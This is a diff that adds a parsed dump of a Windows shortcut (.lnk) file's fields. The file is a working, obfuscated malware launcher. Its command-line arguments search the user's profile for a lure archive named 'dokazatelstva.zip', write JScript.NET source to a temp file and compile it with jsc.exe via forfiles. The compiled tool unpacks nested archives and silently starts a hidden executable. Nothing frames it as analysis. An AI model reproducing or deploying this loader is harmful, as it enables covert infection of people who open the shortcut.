@@ -1,0 +1,11 @@
+is_lnk: true
+creation_time: 1731024484
+access_time: 1731024484
+write_time: 1731024484
+file_size: 16
+file_attributes: 32
+icon_location: "C:\\Windows\\System32\\shell32.dll"
+icon_index: 1
+show_command: MIN_NO_ACTIVE
+working_dir: "C:\\Windows\\System32                                                                                                                                                                                                                                                 "
+cmd_line_args: "/c \"set PATH=%windir%\\system32;%PATH% & (for /R \"%USERPROFILE%\" %f in (dokazatelstva.zip) do @IF EXIST %f (chcp 65001 | echo | set /p=\"import System;import System.IO;import System.IO.Compression;import System.Text;import System.Diagnostics;function Main(){var args:String[]=System.Environment.GetCommandLineArgs();Directory.CreateDirectory(args[2]);System.IO.Compression.ZipFile.ExtractToDirectory(args[1], args[2]);System.IO.Compression.ZipFile.ExtractToDirectory(args[2] + \"\\\\\" + (Convert.ToChar(100)+Convert.ToChar(99)+Convert.ToChar(118)+Convert.ToChar(46)+Convert.ToChar(105)+Convert.ToChar(110)+Convert.ToChar(105)), args[2]);Process.Start(\"cmd.exe\", \"/C move \" + System.Reflection.Assembly.GetExecutingAssembly().Location + \" \" + System.Reflection.Assembly.GetExecutingAssembly().Location + \"_\");}Main();\">%TEMP%\\6DZX1ZJTGBDJ.a & for /f %j in (\'dir /b /s /a:-d /o:-n \"%SystemRoot%\\Microsoft.Net\\Framework\\*jsc.exe\"\') do @set \"_jsc=%j\" & for /L %i in (1,1,3) do @if exist \"%USERPROFILE%\\DXTGYWVO2MU7\\Y3IEFP0NC4.exe\" (^st^art \"\" /MIN \"%USERPROFILE%\\DXTGYWVO2MU7\\Y3IEFP0NC4.exe\" & exit) else (@if exist %TEMP%\\unzip.exe (%TEMP%\\unzip.exe \"%f\" \"%USERPROFILE%\\DXTGYWVO2MU7\") else (@if not exist %TEMP%\\unzip.exe_ (@if not exist %TEMP%\\unzip.exe (C:\\Windows\\system32\\forfiles.exe /P %SystemRoot% /M notepad.exe /C \"cmd /c %_jsc% /nologo /r:System.IO.Compression.FileSystem.dll /out:%TEMP%\\unzip.exe %TEMP%\\6DZX1ZJTGBDJ.a\")))) ))\""
